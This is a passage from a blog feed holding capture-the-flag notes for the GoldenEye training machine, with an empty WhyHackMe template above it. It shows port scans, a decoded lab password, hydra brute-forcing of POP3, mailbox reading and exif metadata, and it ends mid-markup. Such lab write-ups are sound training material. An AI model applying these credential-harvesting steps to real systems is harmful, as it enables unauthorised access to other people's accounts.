1013847d54593a2f085c42af4fb2e215fb9c7bcd6283bcdc7f54eacf5e5a0225c1c7f2cf1b0b32bb7950dd138d9cbfc362c11936716fc35be8e1f009219af7bf1a90475d5e0df72fdb2b63fae1d148c87f61c291c3ebc921fc8521fef154a80499f8aaba9f09ee8ef0709f7eead37cd856c4fcdb641f33fc6133799b26c9c4528eecf020359e65ff15ba8771b5aa64276cde55720a8627429fe07e4ab28113bd286643bce86a0001269a695482024632c4a15f7be7ee8d5bfc27a77328072a3e494d2ff252de6417bbba7c680ae5d00a715f265f6baa44f70ac07758904f18cd0d125acf91ffef7e444a7a83bc3ac7deb10c131bf568323842788043ab7db21d6af49801dabdc5bad396f1b33430906251094e95ddeebdb6d69a12db6cdfb2d26689be49583e808716a6f7d5f3252ec485b182931dbe522414fad0b60a7e872b3bc4006be002d41a753e94003e31829e6b5f7bc7e8527b3d4e96d23a2578a2192f382aac65e90da14207ee8072fdebc57657f2ca03f6be8b1996fcdf0256d88df1bf756484c8a0e67a9b6bb39eeb690f59b0d9b35ac9480779ea9397636475b517d4c5cb8b583a30d229b0913d0849cb27615d2f238b7edf4fde0d06fab71888aa89545bfa782544c4648780509958baf3081ca3df422ec7f46da8bc7cf95d510dbd0ff2bb8126522b751d4310a56e4eb92a866bfb088d85adb73fbfa9cba449bbff5aa9b98d51ac65417b9fff24b3dc0c33c3720264f8b79322b2193db4f09abd271ca377e0f15ace190f56ae6fda7768ed8626a975fec5e5fddea244d3a51a417cc5bc9c775ce83c33db6959d90b9297cd30a1dfb8deef5bd09398a67d189671cfba6963bec3967a22eff5eccd0f674569b9256310493200e7cc1631d8b3d9ff589ce67c55f8bf782ddfbb04d1e530c30309845de138bfd2dc8bc55c8c8d94a68cd4d43920c8775909eef2a91c4c681319cc3416a40a60abe686e52d74efbc35aeff5f2592122fb181a67361303caf867bd301fec294c4c75eae4b4a59e352e31b6a470449edc0ded161bfa95a3694ff0a67e07f343ff67852b13dc8b6c6bacafdfe099a342393b07005ae84f3d9ec1fc88d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/18/whyhackme/"/>
      <url>/2024/11/18/whyhackme/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：<br>描述：<br>前置条件：</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td></td></tr><tr><td>OS</td><td>kali</td><td></td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><p>ftp anenomous</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don&#x27;t worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.</span><br></pre></td></tr></table></figure><p>SSRF ?</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoldenEye</title>
      <link href="/2024/11/18/GoldenEye/"/>
      <url>/2024/11/18/GoldenEye/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：<br>描述：<br>前置条件：</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.112.90</td></tr><tr><td>OS</td><td>kali</td><td>Linxu</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE REASON</span><br><span class="line">25/tcp    open  smtp    syn-ack</span><br><span class="line">80/tcp    open  http    syn-ack</span><br><span class="line">55006/tcp open  unknown syn-ack</span><br><span class="line">55007/tcp open  unknown syn-ack</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds</span><br><span class="line"></span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: GoldenEye Primary Admin Server</span><br><span class="line">55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA TOP SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES UIDL PIPELINING</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after:  2028-04-23T03:23:52</span><br><span class="line">| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV</span><br><span class="line">| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG</span><br><span class="line">| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe</span><br><span class="line">| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj</span><br><span class="line">| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j</span><br><span class="line">| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI</span><br><span class="line">| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd</span><br><span class="line">| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3</span><br><span class="line">| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr</span><br><span class="line">| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/</span><br><span class="line">| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM</span><br><span class="line">| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w</span><br><span class="line">| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi</span><br><span class="line">| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB</span><br><span class="line">| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi</span><br><span class="line">| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45</span><br><span class="line">| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a</span><br><span class="line">| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so</span><br><span class="line">| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm</span><br><span class="line">| e1/vPH7tRtldZFSfflyHUsA=</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">55007/tcp open  pop3     syn-ack Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA AUTH-RESP-CODE USER RESP-CODES TOP SASL(PLAIN) STLS PIPELINING UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after:  2028-04-23T03:23:52</span><br><span class="line">| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV</span><br><span class="line">| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG</span><br><span class="line">| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe</span><br><span class="line">| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj</span><br><span class="line">| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j</span><br><span class="line">| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI</span><br><span class="line">| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd</span><br><span class="line">| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3</span><br><span class="line">| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr</span><br><span class="line">| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/</span><br><span class="line">| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM</span><br><span class="line">| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w</span><br><span class="line">| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi</span><br><span class="line">| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB</span><br><span class="line">| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi</span><br><span class="line">| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45</span><br><span class="line">| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a</span><br><span class="line">| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so</span><br><span class="line">| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm</span><br><span class="line">| e1/vPH7tRtldZFSfflyHUsA=</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 42.11 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><p>信息泄露<br><code>Boris</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">`&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;` 是 **HTML 实体编码**（HTML Character Entities），其中每个 `&amp;#x;` 表示一个字符的 Unicode 编码。具体来说，这些数字是字符的 Unicode 代码点（十进制表示）。</span><br><span class="line"></span><br><span class="line">让我们将每个数字转换为对应的字符：</span><br><span class="line"></span><br><span class="line">1. `&amp;#73;` = **I**</span><br><span class="line">2. `&amp;#110;` = **n**</span><br><span class="line">3. `&amp;#118;` = **v**</span><br><span class="line">4. `&amp;#105;` = **i**</span><br><span class="line">5. `&amp;#110;` = **n**</span><br><span class="line">6. `&amp;#99;` = **c**</span><br><span class="line">7. `&amp;#105;` = **i**</span><br><span class="line">8. `&amp;#98;` = **b**</span><br><span class="line">9. `&amp;#108;` = **l**</span><br><span class="line">10. `&amp;#101;` = **e**</span><br><span class="line">11. `&amp;#72;` = **H**</span><br><span class="line">12. `&amp;#97;` = **a**</span><br><span class="line">13. `&amp;#99;` = **c**</span><br><span class="line">14. `&amp;#107;` = **k**</span><br><span class="line">15. `&amp;#51;` = **3**</span><br><span class="line">16. `&amp;#114;` = **r**</span><br><span class="line"></span><br><span class="line">将这些字符拼接起来，得到的字符串是：</span><br><span class="line"></span><br><span class="line">**&quot;InvincibleHack3r&quot;**</span><br><span class="line"></span><br><span class="line">因此，`&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;` 是 **&quot;InvincibleHack3r&quot;** 的 HTML 实体编码。</span><br><span class="line"></span><br><span class="line">这是一种通过使用数字编码（Unicode 代码点）来表示文本字符的方式，通常用于防止 HTML 中的特殊字符被浏览器错误解析或显示。</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boris</span><br><span class="line">InvincibleHack3r</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口 55007</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Qualified GoldenEye Network Operator Supervisors: </span><br><span class="line">Natalya</span><br><span class="line">Boris</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241118205552.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118205552.png"></a><br>secret1!</p><h2 id="pop命令"><a href="#pop命令" class="headerlink" title="pop命令"></a>pop命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nc pop.example.com 110</span><br><span class="line"># Server: +OK POP3 server ready</span><br><span class="line">USER test@example.com</span><br><span class="line"># Server: +OK User accepted</span><br><span class="line">PASS mysecretpassword</span><br><span class="line"># Server: +OK Mailbox locked and ready</span><br><span class="line">STAT</span><br><span class="line"># Server: +OK 2 3200</span><br><span class="line">LIST</span><br><span class="line"># Server: +OK 2 messages:</span><br><span class="line"># Server: 1 1600</span><br><span class="line"># Server: 2 1600</span><br><span class="line">RETR 1</span><br><span class="line"># Server: (邮件内容)</span><br><span class="line">QUIT</span><br><span class="line"># Server: +OK Goodbye</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span><br><span class="line"></span><br><span class="line">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span><br><span class="line">.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241118211658.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118211658.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241118212131.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118212131.png"></a></p><p>hyrda pop3</p><p>doak<br>goat</p><p>email<br>Username — dr_doak &amp; Password — 4England!</p><p><a href="/../assets/img/Pasted%20image%2020241118212629.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118212629.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ exiftool for-007.jpg</span><br><span class="line">ExifTool Version Number         : 13.00</span><br><span class="line">File Name                       : for-007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2018:04:25 08:40:02+08:00</span><br><span class="line">File Access Date/Time           : 2024:11:18 21:27:37+08:00</span><br><span class="line">File Inode Change Date/Time     : 2024:11:18 21:27:37+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 